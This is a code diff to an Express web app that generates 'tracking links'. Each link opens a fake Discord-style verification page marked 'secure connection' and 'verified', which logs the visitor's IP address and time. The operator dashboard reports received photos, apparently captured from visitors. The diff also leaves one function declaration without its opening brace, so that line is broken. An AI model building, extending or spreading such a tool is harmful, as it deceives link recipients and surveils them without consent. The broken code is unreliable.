@@ -136,7 +136,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .cmd-photo { color:#ff88cc; }
 .cmd-lang { color:#66ff88; }
 
-#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:190px; padding:20px 20px 18px 20px; }
+#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:160px; padding:20px 20px 18px 20px; }
 #menu-window .menu-title { color:#88ddff; font-size:15px; margin-bottom:14px; font-weight:bold; letter-spacing:1px; }
 #menu-window .btn-row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
 #menu-window .btn-link { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 24px; font-family:inherit; font-size:14px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
@@ -172,15 +172,13 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   <div class="drag-area" id="menu-drag"></div>
   <div class="menu-title">■ LINK GENERATOR</div>
   <div class="btn-row">
-    <button class="btn-link" id="generate-btn" disabled>GENERATE</button>
+    <button class="btn-link" id="generate-btn">GENERATE</button>
     <button class="btn-copy" id="copy-btn" style="display:none;">📋 COPY</button>
   </div>
-  <div class="custom-label">認証表示テキスト（任意）</div>
-  <input type="text" class="custom-input" id="custom-text" placeholder="例: 認証済みユーザー" spellcheck="false">
   <div class="custom-label">完了メッセージ（任意）</div>
   <input type="text" class="custom-input" id="done-text" placeholder="例: ようこそ！" spellcheck="false">
   <div class="result-area" id="result-area">
-    <span class="status-msg">テキストを入力してGENERATE</span>
+    <span class="status-msg">Press GENERATE to create a tracking link</span>
   </div>
   <div class="resize-handle" id="menu-resize"></div>
 </div>
@@ -264,22 +262,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     addCmdOutput('[PHOTO] Image #' + photoCountNum + ' received', 'cmd-photo');
   });
 
-  // ★ テキスト入力でGENERATEボタンの有効/無効を切り替え
-  const generateBtn = document.getElementById('generate-btn');
-  const customTextInput = document.getElementById('custom-text');
-  const doneTextInput = document.getElementById('done-text');
-
-  customTextInput.addEventListener('input', function() {
-    const text = customTextInput.value.trim();
-    if (text.length > 0) {
-      generateBtn.disabled = false;
-      generateBtn.style.opacity = '1';
-    } else {
-      generateBtn.disabled = true;
-      generateBtn.style.opacity = '0.4';
-    }
-  });
-
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -335,12 +317,10 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
           document.getElementById('cmd-prompt').textContent = '$';
           document.getElementById('menu-window').querySelector('.menu-title').textContent = '■ リンク生成';
           document.getElementById('generate-btn').textContent = '生成';
-          document.getElementById('result-area').querySelector('.status-msg').textContent = 'テキストを入力して生成';
+          document.getElementById('result-area').querySelector('.status-msg').textContent = '生成ボタンでリンクを作成';
           document.getElementById('copy-btn').textContent = '📋 コピー';
-          document.querySelectorAll('.custom-label')[0].textContent = '認証表示テキスト（任意）';
-          document.querySelectorAll('.custom-label')[1].textContent = '完了メッセージ（任意）';
-          customTextInput.placeholder = '例: 認証済みユーザー';
-          doneTextInput.placeholder = '例: ようこそ！';
+          document.querySelector('.custom-label').textContent = '完了メッセージ（任意）';
+          document.getElementById('done-text').placeholder = '例: ようこそ！';
         });
         return;
       }
@@ -354,12 +334,10 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
           document.getElementById('cmd-prompt').textContent = '$';
           document.getElementById('menu-window').querySelector('.menu-title').textContent = '■ LINK GENERATOR';
           document.getElementById('generate-btn').textContent = 'GENERATE';
-          document.getElementById('result-area').querySelector('.status-msg').textContent = 'Enter text and GENERATE';
+          document.getElementById('result-area').querySelector('.status-msg').textContent = 'Press GENERATE to create a link';
           document.getElementById('copy-btn').textContent = '📋 COPY';
-          document.querySelectorAll('.custom-label')[0].textContent = 'Auth display text (optional)';
-          document.querySelectorAll('.custom-label')[1].textContent = 'Done message (optional)';
-          customTextInput.placeholder = 'e.g. Verified User';
-          doneTextInput.placeholder = 'e.g. Welcome!';
+          document.querySelector('.custom-label').textContent = 'Done message (optional)';
+          document.getElementById('done-text').placeholder = 'e.g. Welcome!';
         });
         return;
       }
@@ -373,19 +351,16 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     }
   });
 
+  const generateBtn = document.getElementById('generate-btn');
   const copyBtn = document.getElementById('copy-btn');
   const resultArea = document.getElementById('result-area');
+  const doneTextInput = document.getElementById('done-text');
   let currentLink = '';
 
   async function generateLink() {
-    const customText = customTextInput.value.trim();
     const doneText = doneTextInput.value.trim() || '認証完了';
-    if (!customText) {
-      resultArea.innerHTML = '<span class="status-msg" style="color:#ff4444;">⚠️ テキストを入力してください</span>';
-      return;
-    }
     try {
-      const res = await fetch('/generate?text=' + encodeURIComponent(customText) + '&done=' + encodeURIComponent(doneText));
+      const res = await fetch('/generate?done=' + encodeURIComponent(doneText));
       const data = await res.json();
       currentLink = data.link;
       resultArea.innerHTML = '<a href="#" class="link-display" id="generated-link">🔗 ' + currentLink + '</a><span class="status-msg">✅ Link generated!</span>';
@@ -479,8 +454,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
   makeDraggable('menu-window', 'menu-drag', 'menu-resize');
 
-  function clampWindows() {
-    document.querySelectorAll('.window').forEach(function(win) {
+  function clampWindows()    document.querySelectorAll('.window').forEach(function(win) {
       var rect = win.getBoundingClientRect();
       var maxW = window.innerWidth - 20;
       var maxH = window.innerHeight - 20;
@@ -518,9 +492,8 @@ app.get('/', (req, res) => {
 
 app.get('/generate', (req, res) => {
   const id = generateId();
-  const customText = req.query.text || '認証済み';
   const doneText = req.query.done || '認証完了';
-  const link = `https://${req.get('host')}/t/${id}?text=${encodeURIComponent(customText)}&done=${encodeURIComponent(doneText)}`;
+  const link = `https://${req.get('host')}/t/${id}?done=${encodeURIComponent(doneText)}`;
   res.json({ link });
 });
 
@@ -529,12 +502,11 @@ app.get('/lang/:l', (req, res) => {
   res.sendStatus(200);
 });
 
-// ★ 相手側ページ
+// ★ 相手側ページ（日本語・Discord風・完了メッセージ対応）
 app.get('/t/:id', (req, res) => {
   const id = req.params.id;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
   const time = new Date().toLocaleString('ja-JP');
-  const customText = req.query.text || '認証済み';
   const doneText = req.query.done || '認証完了';
 
   res.send(`<!DOCTYPE html>
@@ -581,7 +553,7 @@ app.get('/t/:id', (req, res) => {
     </div>
     <button class="btn-next" id="btn-next">次のサイトを見る</button>
     <div class="foot"><i class="fas fa-shield-alt"></i> 安全な接続 <span style="color:#ccc;">•</span> <i class="fab fa-discord"></i> Discord</div>
-    <div class="discord-shield"><i class="fas fa-check-circle"></i> ${customText}</div>
+    <div class="discord-shield"><i class="fas fa-check-circle"></i> 認証済み</div>
   </div>
 
   <script>
